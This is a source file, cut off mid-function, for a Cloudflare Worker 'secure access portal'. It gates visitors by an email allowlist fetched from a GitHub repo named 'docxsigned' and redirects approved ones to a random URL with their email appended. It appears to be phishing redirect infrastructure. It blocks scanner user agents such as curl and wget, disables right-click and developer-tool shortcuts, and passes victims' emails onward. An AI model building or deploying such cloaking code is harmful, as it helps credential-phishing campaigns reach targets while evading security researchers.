// Cloudflare Worker for secure redirect landing page
// Enhanced with KV storage, advanced bot protection, and real-time updates

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    // Handle CORS preflight requests
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 200,
        status: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, X-Client-Hash, X-User-Agent, X-Screen-Resolution',
        },
      });
    }

    // Serve static files
    if (path === '/' || path === '/index.html') {
      return serveStaticFile('index.html');
    }

    if (path === '/styles.css') {
      return serveStaticFile('styles.css');
    }

    if (path === '/script.js') {
      return serveStaticFile('script.js');
    }

    // API endpoints
    if (path === '/api/validate') {
      return handleValidation(request, env);
    }

    if (path === '/api/config') {
      return handleConfigRequest(request, env);
    }

    if (path === '/api/analytics') {
      return handleAnalyticsRequest(request, env);
    }

    // 404 for unknown routes
    return new Response('Not Found', { status: 404 });
  },
};

async function handleValidation(request, env) {
  try {
    // Only allow POST requests
    if (request.method !== 'POST') {
      return new Response('Method Not Allowed', { status: 405 });
    }

    const clientIP = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    'unknown';

    // Enhanced bot protection - Browser fingerprinting
    const userAgent = request.headers.get('User-Agent') || '';
    const clientHash = request.headers.get('X-Client-Hash') || '';
    const screenResolution = request.headers.get('X-Screen-Resolution') || '';
    
    // Bot detection checks
    const botScore = await analyzeBotBehavior(clientIP, userAgent, clientHash, screenResolution);
    if (botScore > 0.8) {
      console.log(`High bot score detected for IP: ${clientIP}, score: ${botScore}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Access denied' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Check blacklist
    const blacklist = await getBlacklist();
    if (blacklist.includes(clientIP)) {
      console.log(`Blocked blacklisted IP: ${clientIP}`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Access denied' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Enhanced rate limiting with KV storage and exponential backoff
    const rateLimit = await checkRateLimitEnhanced(clientIP, env);
    if (!rateLimit.allowed) {
      const delay = calculateExponentialBackoff(rateLimit.attempts);
      console.log(`Rate limited IP: ${clientIP}, attempts: ${rateLimit.attempts}, delay: ${delay}s`);
      return new Response(JSON.stringify({ 
        success: false, 
        message: `Too many attempts. Try again in ${rateLimit.retryAfter} seconds.`,
        retryAfter: rateLimit.retryAfter,
        delay: delay
      }), {
        status: 429,
        headers: { 
          'Content-Type': 'application/json',
          'Retry-After': rateLimit.retryAfter.toString()
        }
      });
    }

    const body = await request.json();
    const { email, turnstileToken, honeypotField } = body;

    // Honeypot field validation
    if (honeypotField && honeypotField.trim() !== '') {
      console.log(`Honeypot field filled by IP: ${clientIP}`);
      await logSuspiciousActivity(clientIP, 'honeypot_filled', env);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Access denied' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    if (!email || !turnstileToken) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Missing required fields' 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Enhanced email validation
    const emailValidation = await validateEmailEnhanced(email);
    if (!emailValidation.valid) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: emailValidation.message 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Time-based challenge difficulty
    const challengeDifficulty = await getChallengeDifficulty(clientIP, env);
    
    // Verify Turnstile token with dynamic difficulty
    const turnstileValid = await verifyTurnstileEnhanced(turnstileToken, clientIP, challengeDifficulty);
    if (!turnstileValid) {
      console.log(`Invalid Turnstile token for IP: ${clientIP}`);
      await incrementFailedAttemptsEnhanced(clientIP, env);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Invalid verification token' 
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Check if email is in whitelist (real-time from GitHub)
    const whitelist = await getWhitelistRealTime();
    const isWhitelisted = whitelist.includes(email);

    if (!isWhitelisted) {
      // Increment failed attempts with exponential backoff
      await incrementFailedAttemptsEnhanced(clientIP, env);
      
      console.log(`Unauthorized access attempt - IP: ${clientIP}, Email: ${email}`);
      await logSuspiciousActivity(clientIP, 'unauthorized_email', env);
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'Email not authorized' 
      }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Get random redirect URL (real-time from GitHub)
    const redirectUrl = await getRandomRedirectUrlRealTime();
    if (!redirectUrl) {
      return new Response(JSON.stringify({ 
        success: false, 
        message: 'No redirect URLs available' 
      }), {
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Append email to redirect URL
    const finalUrl = `${redirectUrl}#${encodeURIComponent(email)}`;

    // Log successful access with enhanced analytics
    await logSuccessfulAccess(clientIP, email, finalUrl, env);
    console.log(`Successful redirect - IP: ${clientIP}, Email: ${email}, URL: ${finalUrl}`);

    return new Response(JSON.stringify({ 
      success: true, 
      redirectUrl: finalUrl 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (error) {
    console.error('Validation error:', error);
    return new Response(JSON.stringify({ 
      success: false, 
      message: 'Internal server error' 
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function verifyTurnstile(token, clientIP) {
  try {
    const formData = new FormData();
    formData.append('secret', 'YOUR_TURNSTILE_SECRET_KEY'); // Replace with your secret key
    formData.append('response', token);
    formData.append('remoteip', clientIP);

    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: formData,
    });

    const result = await response.json();
    return result.success;
  } catch (error) {
    console.error('Turnstile verification error:', error);
    return false;
  }
}

async function getWhitelist() {
  try {
    // In production, fetch from your GitHub repo
    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json');
    const data = await response.json();
    return data.emails || [];
  } catch (error) {
    console.error('Error fetching whitelist:', error);
    return [];
  }
}

async function getBlacklist() {
  try {
    // In production, fetch from your GitHub repo
    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/blacklist.txt');
    const text = await response.text();
    return text.split('\n').filter(ip => ip.trim() !== '');
  } catch (error) {
    console.error('Error fetching blacklist:', error);
    return [];
  }
}

async function getRandomRedirectUrl() {
  try {
    // In production, fetch from your GitHub repo
    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json');
    const data = await response.json();
    const urls = data.urls || [];
    
    if (urls.length === 0) return null;
    
    const randomIndex = Math.floor(Math.random() * urls.length);
    return urls[randomIndex];
  } catch (error) {
    console.error('Error fetching redirect URLs:', error);
    return null;
  }
}

// Enhanced rate limiting with KV storage and exponential backoff
async function checkRateLimitEnhanced(clientIP, env) {
  const now = Date.now();
  const windowMs = 15 * 60 * 1000; // 15 minutes
  const maxAttempts = 3;

  try {
    // Use KV for persistent rate limiting
    const rateLimitKey = `rate_limit:${clientIP}`;
    const rateLimitData = await env.RATE_LIMIT_KV.get(rateLimitKey, { type: 'json' });
    
    const attempts = rateLimitData?.attempts || [];
    const recentAttempts = attempts.filter(timestamp => now - timestamp < windowMs);

    if (recentAttempts.length >= maxAttempts) {
      const oldestAttempt = Math.min(...recentAttempts);
      const retryAfter = Math.ceil((oldestAttempt + windowMs - now) / 1000);
      
      return {
        allowed: false,
        attempts: recentAttempts.length,
        retryAfter
      };
    }

    return { allowed: true, attempts: recentAttempts.length };
  } catch (error) {
    console.error('Rate limit check error:', error);
    // Fallback to allow access if KV fails
    return { allowed: true, attempts: 0 };
  }
}

async function incrementFailedAttemptsEnhanced(clientIP, env) {
  const now = Date.now();
  const windowMs = 15 * 60 * 1000;
  
  try {
    const rateLimitKey = `rate_limit:${clientIP}`;
    const rateLimitData = await env.RATE_LIMIT_KV.get(rateLimitKey, { type: 'json' });
    
    const attempts = rateLimitData?.attempts || [];
    attempts.push(now);
    
    // Keep only recent attempts
    const recentAttempts = attempts.filter(timestamp => now - timestamp < windowMs);
    
    // Store with TTL (15 minutes)
    await env.RATE_LIMIT_KV.put(rateLimitKey, JSON.stringify({
      attempts: recentAttempts,
      lastUpdated: now
    }), { expirationTtl: 900 }); // 15 minutes
  } catch (error) {
    console.error('Rate limit increment error:', error);
  }
}

function calculateExponentialBackoff(attempts) {
  // Exponential backoff: 2^attempts seconds, max 3600 seconds (1 hour)
  const baseDelay = Math.pow(2, attempts);
  return Math.min(baseDelay, 3600);
}

// Enhanced bot protection
async function analyzeBotBehavior(clientIP, userAgent, clientHash, screenResolution) {
  let botScore = 0;
  
  // Check for common bot user agents
  const botPatterns = [
    /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
    /python/i, /java/i, /perl/i, /ruby/i, /php/i, /go-http-client/i
  ];
  
  for (const pattern of botPatterns) {
    if (pattern.test(userAgent)) {
      botScore += 0.3;
    }
  }
  
  // Check for missing or suspicious client hash
  if (!clientHash || clientHash.length < 10) {
    botScore += 0.2;
  }
  
  // Check for missing screen resolution
  if (!screenResolution || screenResolution === '0x0') {
    botScore += 0.2;
  }
  
  // Check for suspicious user agent patterns
  if (userAgent.length < 20 || userAgent.length > 500) {
    botScore += 0.1;
  }
  
  // Check for common browser patterns
  const browserPatterns = [/chrome/i, /firefox/i, /safari/i, /edge/i];
  let hasBrowserPattern = false;
  for (const pattern of browserPatterns) {
    if (pattern.test(userAgent)) {
      hasBrowserPattern = true;
      break;
    }
  }
  
  if (!hasBrowserPattern) {
    botScore += 0.2;
  }
  
  return Math.min(botScore, 1.0);
}

// Enhanced email validation
async function validateEmailEnhanced(email) {
  // Basic format check
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return { valid: false, message: 'Invalid email format' };
  }
  
  // Check for disposable email domains
  const disposableDomains = [
    '10minutemail.com', 'tempmail.org', 'guerrillamail.com',
    'mailinator.com', 'throwaway.email', 'temp-mail.org'
  ];
  
  const domain = email.split('@')[1].toLowerCase();
  if (disposableDomains.includes(domain)) {
    return { valid: false, message: 'Disposable email addresses are not allowed' };
  }
  
  // Check email length
  if (email.length > 254) {
    return { valid: false, message: 'Email address too long' };
  }
  
  return { valid: true, message: 'Email is valid' };
}

// Time-based challenge difficulty
async function getChallengeDifficulty(clientIP, env) {
  try {
    const now = Date.now();
    const hour = new Date(now).getHours();
    
    // Higher difficulty during peak hours (9 AM - 6 PM)
    const isPeakHour = hour >= 9 && hour <= 18;
    
    // Check recent suspicious activity
    const suspiciousKey = `suspicious:${clientIP}`;
    const suspiciousData = await env.RATE_LIMIT_KV.get(suspiciousKey, { type: 'json' });
    const recentSuspicious = suspiciousData?.count || 0;
    
    let difficulty = 'normal';
    
    if (isPeakHour) {
      difficulty = 'high';
    }
    
    if (recentSuspicious > 2) {
      difficulty = 'very_high';
    }
    
    return difficulty;
  } catch (error) {
    console.error('Challenge difficulty error:', error);
    return 'normal';
  }
}

// Enhanced Turnstile verification
async function verifyTurnstileEnhanced(token, clientIP, difficulty) {
  try {
    const formData = new FormData();
    formData.append('secret', 'YOUR_TURNSTILE_SECRET_KEY');
    formData.append('response', token);
    formData.append('remoteip', clientIP);

    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      body: formData,
    });

    const result = await response.json();
    
    // Additional difficulty-based validation
    if (result.success && difficulty === 'very_high') {
      // Add additional checks for very high difficulty
      const score = result.score || 0.5;
      return score > 0.8;
    }
    
    return result.success;
  } catch (error) {
    console.error('Turnstile verification error:', error);
    return false;
  }
}

// Real-time configuration from GitHub
async function getWhitelistRealTime() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json', {
      headers: {
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      }
    });
    const data = await response.json();
    return data.emails || [];
  } catch (error) {
    console.error('Error fetching real-time whitelist:', error);
    return [];
  }
}

async function getRandomRedirectUrlRealTime() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json', {
      headers: {
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      }
    });
    const data = await response.json();
    const urls = data.urls || [];
    
    if (urls.length === 0) return null;
    
    const randomIndex = Math.floor(Math.random() * urls.length);
    return urls[randomIndex];
  } catch (error) {
    console.error('Error fetching real-time redirect URLs:', error);
    return null;
  }
}

// Enhanced logging
async function logSuspiciousActivity(clientIP, activityType, env) {
  try {
    const logKey = `suspicious:${clientIP}`;
    const logData = await env.RATE_LIMIT_KV.get(logKey, { type: 'json' });
    
    const now = Date.now();
    const activities = logData?.activities || [];
    activities.push({ type: activityType, timestamp: now });
    
    // Keep only recent activities (last 24 hours)
    const dayAgo = now - (24 * 60 * 60 * 1000);
    const recentActivities = activities.filter(activity => activity.timestamp > dayAgo);
    
    await env.RATE_LIMIT_KV.put(logKey, JSON.stringify({
      activities: recentActivities,
      count: recentActivities.length,
      lastUpdated: now
    }), { expirationTtl: 86400 }); // 24 hours
  } catch (error) {
    console.error('Log suspicious activity error:', error);
  }
}

async function logSuccessfulAccess(clientIP, email, redirectUrl, env) {
  try {
    const now = Date.now();
    const logEntry = {
      timestamp: now,
      ip: clientIP,
      email: email,
      redirectUrl: redirectUrl,
      success: true
    };
    
    // Store in analytics KV
    const analyticsKey = `analytics:${now}`;
    await env.RATE_LIMIT_KV.put(analyticsKey, JSON.stringify(logEntry), { expirationTtl: 2592000 }); // 30 days
  } catch (error) {
    console.error('Log successful access error:', error);
  }
}

// Configuration and analytics endpoints
async function handleConfigRequest(request, env) {
  try {
    const config = {
      theme: 'auto', // auto, light, dark
      language: 'en',
      branding: {
        title: 'Secure Access Portal',
        logo: null,
        primaryColor: '#667eea',
        secondaryColor: '#764ba2'
      },
      features: {
        darkMode: true,
        multiLanguage: true,
        accessibility: true
      }
    };
    
    return new Response(JSON.stringify(config), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    return new Response(JSON.stringify({ error: 'Configuration error' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function handleAnalyticsRequest(request, env) {
  try {
    // This would typically aggregate data from KV storage
    const analytics = {
      totalRequests: 0,
      successfulRedirects: 0,
      blockedAttempts: 0,
      rateLimited: 0
    };
    
    return new Response(JSON.stringify(analytics), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    return new Response(JSON.stringify({ error: 'Analytics error' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

async function serveStaticFile(filename) {
  const files = {
    'index.html': `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <link rel="stylesheet" href="/styles.css">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>
    <!-- Theme toggle button -->
    <div class="theme-toggle">
        <button id="themeToggle" class="theme-btn" aria-label="Toggle dark mode">
            <span class="theme-icon">🌙</span>
        </button>
    </div>

    <!-- Language selector -->
    <div class="language-selector">
        <select id="languageSelect" class="lang-select" aria-label="Select language">
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
            <option value="de">Deutsch</option>
        </select>
    </div>

    <div class="container">
        <div class="card">
            <div class="header">
                <h1 id="pageTitle">Secure Access Portal</h1>
                <p id="pageSubtitle">Enter your email to continue</p>
            </div>
            
            <form id="emailForm" class="email-form">
                <div class="input-group">
                    <input 
                        type="email" 
                        id="emailInput" 
                        placeholder="Enter your email address"
                        required
                        autocomplete="email"
                        aria-describedby="emailHelp"
                    >
                    <div id="emailHelp" class="help-text" style="display: none;"></div>
                    
                    <!-- Honeypot field (hidden from users) -->
                    <input 
                        type="text" 
                        id="honeypotField" 
                        name="honeypot" 
                        style="position: absolute; left: -9999px; opacity: 0;"
                        tabindex="-1"
                        autocomplete="off"
                    >
                    
                    <div class="turnstile-container">
                        <div class="cf-turnstile" data-sitekey="YOUR_TURNSTILE_SITE_KEY"></div>
                    </div>
                </div>
                
                <button type="submit" id="submitBtn" class="submit-btn">
                    <span class="btn-text">Continue</span>
                    <span class="btn-loading" style="display: none;">Verifying...</span>
                </button>
            </form>
            
            <div id="message" class="message" style="display: none;" role="alert"></div>
        </div>
    </div>
    
    <!-- Accessibility improvements -->
    <div class="accessibility-controls">
        <button id="increaseFontSize" class="accessibility-btn" aria-label="Increase font size">A+</button>
        <button id="decreaseFontSize" class="accessibility-btn" aria-label="Decrease font size">A-</button>
        <button id="highContrast" class="accessibility-btn" aria-label="Toggle high contrast">⚫</button>
    </div>
    
    <script src="/script.js"></script>
</body>
</html>`,
    'styles.css': `/* Reset and base styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root {
    --primary-color: #667eea;
    --secondary-color: #764ba2;
    --text-color: #2c3e50;
    --text-secondary: #7f8c8d;
    --background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    --card-bg: rgba(255, 255, 255, 0.95);
    --border-color: #e1e8ed;
    --success-color: #27ae60;
    --error-color: #e74c3c;
    --font-size: 16px;
    --border-radius: 12px;
    --transition: all 0.3s ease;
}

/* Dark mode variables */
[data-theme="dark"] {
    --primary-color: #8b9df3;
    --secondary-color: #9b6bb8;
    --text-color: #ecf0f1;
    --text-secondary: #bdc3c7;
    --background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
    --card-bg: rgba(44, 62, 80, 0.95);
    --border-color: #34495e;
}

/* High contrast mode */
[data-theme="high-contrast"] {
    --primary-color: #000000;
    --secondary-color: #ffffff;
    --text-color: #000000;
    --text-secondary: #333333;
    --background: #ffffff;
    --card-bg: #ffffff;
    --border-color: #000000;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: var(--background);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    font-size: var(--font-size);
    color: var(--text-color);
    transition: var(--transition);
}

/* Theme toggle button */
.theme-toggle {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1000;
}

.theme-btn {
    background: var(--card-bg);
    border: 2px solid var(--border-color);
    border-radius: 50%;
    width: 50px;
    height: 50px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
    transition: var(--transition);
    backdrop-filter: blur(10px);
}

.theme-btn:hover {
    transform: scale(1.1);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
}

/* Language selector */
.language-selector {
    position: fixed;
    top: 20px;
    left: 20px;
    z-index: 1000;
}

.lang-select {
    background: var(--card-bg);
    border: 2px solid var(--border-color);
    border-radius: var(--border-radius);
    padding: 8px 12px;
    font-size: 14px;
    color: var(--text-color);
    cursor: pointer;
    backdrop-filter: blur(10px);
    transition: var(--transition);
}

.lang-select:focus {
    outline: none;
    border-color: var(--primary-color);
    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

.container {
    width: 100%;
    max-width: 400px;
    animation: fadeIn 0.6s ease-out;
}

.card {
    background: var(--card-bg);
    backdrop-filter: blur(10px);
    border-radius: 20px;
    padding: 40px 30px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
    border: 1px solid var(--border-color);
    transition: var(--transition);
}

.header {
    text-align: center;
    margin-bottom: 30px;
}

.header h1 {
    color: var(--text-color);
    font-size: 28px;
    font-weight: 600;
    margin-bottom: 10px;
    transition: var(--transition);
}

.header p {
    color: var(--text-secondary);
    font-size: 16px;
    transition: var(--transition);
}

.email-form {
    display: flex;
    flex-direction: column;
    gap: 20px;
}

.input-group {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

#emailInput {
    width: 100%;
    padding: 15px 20px;
    border: 2px solid var(--border-color);
    border-radius: var(--border-radius);
    font-size: var(--font-size);
    transition: var(--transition);
    background: var(--card-bg);
    color: var(--text-color);
}

#emailInput:focus {
    outline: none;
    border-color: var(--primary-color);
    box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

#emailInput.error {
    border-color: var(--error-color);
    animation: shake 0.5s ease-in-out;
}

.help-text {
    font-size: 14px;
    color: var(--text-secondary);
    margin-top: 5px;
}

.turnstile-container {
    display: flex;
    justify-content: center;
    margin: 10px 0;
}

.submit-btn {
    width: 100%;
    padding: 15px 20px;
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
    color: white;
    border: none;
    border-radius: var(--border-radius);
    font-size: var(--font-size);
    font-weight: 600;
    cursor: pointer;
    transition: var(--transition);
    position: relative;
    overflow: hidden;
}

.submit-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
}

.submit-btn:active {
    transform: translateY(0);
}

.submit-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
}

.message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 10px;
    text-align: center;
    font-weight: 500;
    transition: var(--transition);
}

.message.success {
    background: rgba(46, 204, 113, 0.1);
    color: var(--success-color);
    border: 1px solid rgba(46, 204, 113, 0.3);
}

.message.error {
    background: rgba(231, 76, 60, 0.1);
    color: var(--error-color);
    border: 1px solid rgba(231, 76, 60, 0.3);
}

/* Accessibility controls */
.accessibility-controls {
    position: fixed;
    bottom: 20px;
    right: 20px;
    display: flex;
    gap: 10px;
    z-index: 1000;
}

.accessibility-btn {
    background: var(--card-bg);
    border: 2px solid var(--border-color);
    border-radius: 50%;
    width: 40px;
    height: 40px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: bold;
    transition: var(--transition);
    backdrop-filter: blur(10px);
}

.accessibility-btn:hover {
    transform: scale(1.1);
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
}

/* Animations */
@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-5px); }
    75% { transform: translateX(5px); }
}

/* Mobile responsiveness */
@media (max-width: 480px) {
    .card {
        padding: 30px 20px;
    }
    
    .header h1 {
        font-size: 24px;
    }
    
    .header p {
        font-size: 14px;
    }
    
    .theme-toggle,
    .language-selector {
        position: static;
        margin-bottom: 20px;
    }
    
    .accessibility-controls {
        position: static;
        justify-content: center;
        margin-top: 20px;
    }
}

/* Focus indicators for accessibility */
*:focus {
    outline: 2px solid var(--primary-color);
    outline-offset: 2px;
}

/* Screen reader only text */
.sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border: 0;
}

/* Disable text selection */
body {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

/* Allow text selection for inputs */
input, textarea, select {
    -webkit-user-select: text;
    -moz-user-select: text;
    -ms-user-select: text;
    user-select: text;
}`,
    'script.js': `// Enhanced security and bot protection
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) {
        e.preventDefault();
    }
    if (e.key === 'F12') {
        e.preventDefault();
    }
});

// Browser fingerprinting for bot detection
function generateClientHash() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Browser fingerprint', 2, 2);
    
    const fingerprint = [
        navigator.userAgent,
        navigator.language,
        screen.width + 'x' + screen.height,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency,
        navigator.deviceMemory,
        canvas.toDataURL()
    ].join('|');
    
    return btoa(fingerprint).substring(0, 32);
}

// Main application logic with enhanced features
class SecureRedirectApp {
    constructor() {
        this.form = document.getElementById('emailForm');
        this.emailInput = document.getElementById('emailInput');
        this.submitBtn = document.getElementById('submitBtn');
        this.messageDiv = document.getElementById('message');
        this.turnstileWidget = null;
        this.config = null;
        this.currentLanguage = 'en';
        this.currentTheme = 'auto';
        
        this.init();
    }
    
    async init() {
        await this.loadConfig();
        this.setupEventListeners();
        this.setupTurnstile();
        this.setupTheme();
        this.setupLanguage();
        this.setupAccessibility();
        this.setupBrowserFingerprinting();
    }
    
    async loadConfig() {
        try {
            const response = await fetch('/api/config');
            this.config = await response.json();
        } catch (error) {
            console.error('Failed to load config:', error);
            this.config = {
                theme: 'auto',
                language: 'en',
                branding: {
                    title: 'Secure Access Portal',
                    primaryColor: '#667eea',
                    secondaryColor: '#764ba2'
                },
                features: {
                    darkMode: true,
                    multiLanguage: true,
                    accessibility: true
                }
            };
        }
    }
    
    setupEventListeners() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.emailInput.addEventListener('input', () => this.clearError());
        this.emailInput.addEventListener('focus', () => this.showHelpText());
        this.emailInput.addEventListener('blur', () => this.hideHelpText());
    }
    
    setupBrowserFingerprinting() {
        // Add browser fingerprinting headers to all requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options = {}) {
            const headers = options.headers || {};
            headers['X-Client-Hash'] = generateClientHash();
            headers['X-User-Agent'] = navigator.userAgent;
            headers['X-Screen-Resolution'] = screen.width + 'x' + screen.height;
            
            options.headers = headers;
            return originalFetch(url, options);
        };
    }
    
    setupTheme() {
        const themeToggle = document.getElementById('themeToggle');
        const savedTheme = localStorage.getItem('theme') || this.config.theme;
        
        this.setTheme(savedTheme);
        
        themeToggle.addEventListener('click', () => {
            const themes = ['auto', 'light', 'dark', 'high-contrast'];
            const currentIndex = themes.indexOf(this.currentTheme);
            const nextIndex = (currentIndex + 1) % themes.length;
            this.setTheme(themes[nextIndex]);
        });
    }
    
    setTheme(theme) {
        this.currentTheme = theme;
        document.documentElement.setAttribute('data-theme', theme);
        localStorage.setItem('theme', theme);
        
        const themeIcon = document.querySelector('.theme-icon');
        const icons = {
            'auto': '🌓',
            'light': '☀️',
            'dark': '🌙',
            'high-contrast': '⚫'
        };
        themeIcon.textContent = icons[theme] || '🌓';
    }
    
    setupLanguage() {
        const languageSelect = document.getElementById('languageSelect');
        const savedLanguage = localStorage.getItem('language') || this.config.language;
        
        languageSelect.value = savedLanguage;
        this.setLanguage(savedLanguage);
        
        languageSelect.addEventListener('change', (e) => {
            this.setLanguage(e.target.value);
        });
    }
    
    setLanguage(language) {
        this.currentLanguage = language;
        localStorage.setItem('language', language);
        
        const translations = {
            en: {
                title: 'Secure Access Portal',
                subtitle: 'Enter your email to continue',
                placeholder: 'Enter your email address',
                continue: 'Continue',
                verifying: 'Verifying...',
                redirecting: 'Redirecting...',
                errorInvalidEmail: 'Please enter a valid email address.',
                errorVerification: 'Please complete the verification.',
                errorAccessDenied: 'Access denied.',
                errorGeneral: 'An error occurred. Please try again.',
                helpEmail: 'Enter a valid email address to continue.'
            },
            es: {
                title: 'Portal de Acceso Seguro',
                subtitle: 'Ingrese su correo electrónico para continuar',
                placeholder: 'Ingrese su dirección de correo electrónico',
                continue: 'Continuar',
                verifying: 'Verificando...',
                redirecting: 'Redirigiendo...',
                errorInvalidEmail: 'Por favor ingrese una dirección de correo válida.',
                errorVerification: 'Por favor complete la verificación.',
                errorAccessDenied: 'Acceso denegado.',
                errorGeneral: 'Ocurrió un error. Por favor intente de nuevo.',
                helpEmail: 'Ingrese una dirección de correo válida para continuar.'
            },
            fr: {
                title: 'Portail d\'Accès Sécurisé',
                subtitle: 'Entrez votre email pour continuer',
                placeholder: 'Entrez votre adresse email',
                continue: 'Continuer',
                verifying: 'Vérification...',
                redirecting: 'Redirection...',
                errorInvalidEmail: 'Veuillez entrer une adresse email valide.',
                errorVerification: 'Veuillez compléter la vérification.',
                errorAccessDenied: 'Accès refusé.',
                errorGeneral: 'Une erreur s\'est produite. Veuillez réessayer.',
                helpEmail: 'Entrez une adresse email valide pour continuer.'
            },
            de: {
                title: 'Sicherer Zugangsportal',
                subtitle: 'Geben Sie Ihre E-Mail-Adresse ein, um fortzufahren',
                placeholder: 'Geben Sie Ihre E-Mail-Adresse ein',
                continue: 'Weiter',
                verifying: 'Überprüfung...',
                redirecting: 'Weiterleitung...',
                errorInvalidEmail: 'Bitte geben Sie eine gültige E-Mail-Adresse ein.',
                errorVerification: 'Bitte vervollständigen Sie die Überprüfung.',
                errorAccessDenied: 'Zugriff verweigert.',
                errorGeneral: 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.',
                helpEmail: 'Geben Sie eine gültige E-Mail-Adresse ein, um fortzufahren.'
            }
        };
        
        const t = translations[language] || translations.en;
        
        document.getElementById('pageTitle').textContent = t.title;
        document.getElementById('pageSubtitle').textContent = t.subtitle;
        this.emailInput.placeholder = t.placeholder;
        this.submitBtn.querySelector('.btn-text').textContent = t.continue;
        this.submitBtn.querySelector('.btn-loading').textContent = t.verifying;
        
        // Update help text
        this.helpText = t.helpEmail;
    }
    
    setupAccessibility() {
        const increaseFontBtn = document.getElementById('increaseFontSize');
        const decreaseFontBtn = document.getElementById('decreaseFontSize');
        const highContrastBtn = document.getElementById('highContrast');
        
        increaseFontBtn.addEventListener('click', () => {
            const currentSize = parseFloat(getComputedStyle(document.body).fontSize);
            document.body.style.fontSize = (currentSize + 2) + 'px';
        });
        
        decreaseFontBtn.addEventListener('click', () => {
            const currentSize = parseFloat(getComputedStyle(document.body).fontSize);
